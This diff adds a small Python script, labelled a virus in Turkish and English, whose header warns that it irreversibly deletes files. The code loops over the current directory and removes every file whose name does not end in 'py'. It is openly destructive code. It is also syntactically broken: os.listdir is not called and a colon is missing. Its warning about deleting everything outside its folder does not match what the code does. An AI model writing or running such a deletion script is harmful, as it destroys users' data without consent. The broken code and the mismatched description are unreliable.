@@ -1,0 +1,17 @@
+               #
+               --asla bu virüsü kişisel bilgisayarınızda çalıştırmayın - Bu virüs çalıştırıldığında, içinde olduğu klasör dışındaki her şeyi geri döndürülemez bir şekilde siler!
+               --never run this virus on your personal computer - When this virus is run, it irreversibly deletes everything except the folder it is in!
+               
+# Gerekli kütüphane/Required library
+import os
+
+# o klosördeki dosyaların listesi 
+files = os.listdir
+
+for f in files
+    # .py uzantılı olmayanları silme  işlemi|||| .py delete non-extension
+    if not f.endswith ('py'):
+        os.remove(f)
+        print(f, "silinme işlemi başarılı oldu")
+        
+print('İşlem tamamlandı!')
